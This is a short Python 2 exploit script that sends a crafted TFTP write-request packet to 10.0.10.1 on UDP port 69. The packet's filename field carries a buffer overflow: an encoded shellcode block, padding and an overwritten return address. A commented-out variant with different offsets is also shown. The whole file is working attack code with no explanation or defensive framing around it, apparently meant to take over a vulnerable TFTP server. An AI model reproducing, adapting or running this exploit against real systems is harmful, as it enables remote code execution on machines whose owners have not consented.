#!/usr/bin/python

import socket

shellcode =  ("\xbe\xa1\x07\x7c\xbd\xda\xd2\xd9\x74\x24\xf4\x5a\x33\xc9\xb1" +
"\x53\x31\x72\x12\x83\xea\xfc\x03\xd3\x09\x9e\x48\xef\xfe\xdc" +
"\xb3\x0f\xff\x80\x3a\xea\xce\x80\x59\x7f\x60\x31\x29\x2d\x8d" +
"\xba\x7f\xc5\x06\xce\x57\xea\xaf\x65\x8e\xc5\x30\xd5\xf2\x44" +
"\xb3\x24\x27\xa6\x8a\xe6\x3a\xa7\xcb\x1b\xb6\xf5\x84\x50\x65" +
"\xe9\xa1\x2d\xb6\x82\xfa\xa0\xbe\x77\x4a\xc2\xef\x26\xc0\x9d" +
"\x2f\xc9\x05\x96\x79\xd1\x4a\x93\x30\x6a\xb8\x6f\xc3\xba\xf0" +
"\x90\x68\x83\x3c\x63\x70\xc4\xfb\x9c\x07\x3c\xf8\x21\x10\xfb" +
"\x82\xfd\x95\x1f\x24\x75\x0d\xfb\xd4\x5a\xc8\x88\xdb\x17\x9e" +
"\xd6\xff\xa6\x73\x6d\xfb\x23\x72\xa1\x8d\x70\x51\x65\xd5\x23" +
"\xf8\x3c\xb3\x82\x05\x5e\x1c\x7a\xa0\x15\xb1\x6f\xd9\x74\xde" +
"\x5c\xd0\x86\x1e\xcb\x63\xf5\x2c\x54\xd8\x91\x1c\x1d\xc6\x66" +
"\x62\x34\xbe\xf8\x9d\xb7\xbf\xd1\x59\xe3\xef\x49\x4b\x8c\x7b" +
"\x89\x74\x59\x11\x81\xd3\x32\x04\x6c\xa3\xe2\x88\xde\x4c\xe9" +
"\x06\x01\x6c\x12\xcd\x2a\x05\xef\xee\x45\x8a\x66\x08\x0f\x22" +
"\x2f\x82\xa7\x80\x14\x1b\x50\xfa\x7e\x33\xf6\xb3\x68\x84\xf9" +
"\x43\xbf\xa2\x6d\xc8\xac\x76\x8c\xcf\xf8\xde\xd9\x58\x76\x8f" +
"\xa8\xf9\x87\x9a\x5a\x99\x1a\x41\x9a\xd4\x06\xde\xcd\xb1\xf9" +
"\x17\x9b\x2f\xa3\x81\xb9\xad\x35\xe9\x79\x6a\x86\xf4\x80\xff" +
"\xb2\xd2\x92\x39\x3a\x5f\xc6\x95\x6d\x09\xb0\x53\xc4\xfb\x6a" +
"\x0a\xbb\x55\xfa\xcb\xf7\x65\x7c\xd4\xdd\x13\x60\x65\x88\x65" +
"\x9f\x4a\x5c\x62\xd8\xb6\xfc\x8d\x33\x73\x0c\xc4\x19\xd2\x85" +
"\x81\xc8\x66\xc8\x31\x27\xa4\xf5\xb1\xcd\x55\x02\xa9\xa4\x50" +
"\x4e\x6d\x55\x29\xdf\x18\x59\x9e\xe0\x08")


#buffer = "A" * 485 + "\x25\x10\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff"  + shellcode

buffer = shellcode + "A" * 118 + "\x4E\xAE\x3A\x7E" + "C" * 23

tftppacket = "\x00\x02" + "Sam" + "\x00" + buffer + "\x00"

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(tftppacket,('10.0.10.1', 69))
response = s.recvfrom(2048)
print response

